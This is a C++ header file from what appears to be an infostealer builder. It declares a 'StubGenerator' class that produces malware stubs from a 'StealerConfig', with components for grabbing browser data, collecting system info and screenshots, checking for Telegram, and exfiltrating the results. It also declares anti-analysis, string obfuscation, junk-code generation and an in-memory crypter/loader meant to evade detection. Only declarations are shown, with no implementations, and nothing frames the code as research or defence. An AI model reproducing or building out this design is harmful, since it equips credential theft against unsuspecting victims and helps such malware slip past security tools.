#ifndef STUBGENERATOR_H
#define STUBGENERATOR_H

#include <QString>
#include "../config/config.h"

class StubGenerator {
public:
    StubGenerator();
    
    // Generate stub source code from configuration
    QString generateStub(const StealerConfig& config) const;
    
    // Save generated stub to file
    bool saveStubToFile(const QString& filename, const StealerConfig& config) const;
    
    // Generate crypter/loader that embeds and executes stub from memory
    QString generateCrypter(const QByteArray& encryptedStub, const QByteArray& key) const;
    
    // Encrypt binary data
    static QByteArray encryptData(const QByteArray& data, const QByteArray& key);
    
private:
    // Generate individual components
    QString generateIncludes(const StealerConfig& config) const;
    QString generateUtilities(const StealerConfig& config) const;
    QString generateStringObfuscation(const StealerConfig& config) const;
    QString generateAntiAnalysis(const StealerConfig& config) const;
    QString generateBrowserGrabber(const StealerConfig& config) const;
    QString generateSystemInfo(const StealerConfig& config) const;
    QString generateScreenshot(const StealerConfig& config) const;
    QString generateTelegramCheck(const StealerConfig& config) const;
    QString generateExfiltration(const StealerConfig& config) const;
    QString generateMainFunction(const StealerConfig& config) const;
    
    // Helper functions
    QString obfuscateString(const QString& str) const;
    QString generateRandomKey() const;
    QString generateJunkCode(int complexity = 3) const;
    QString generateJunkFunction(const QString& functionName) const;
    QString generateRandomVariableName() const;
};

#endif // STUBGENERATOR_H






// Commit 85 - 2024-10-15

// Commit 156 - 2025-04-27


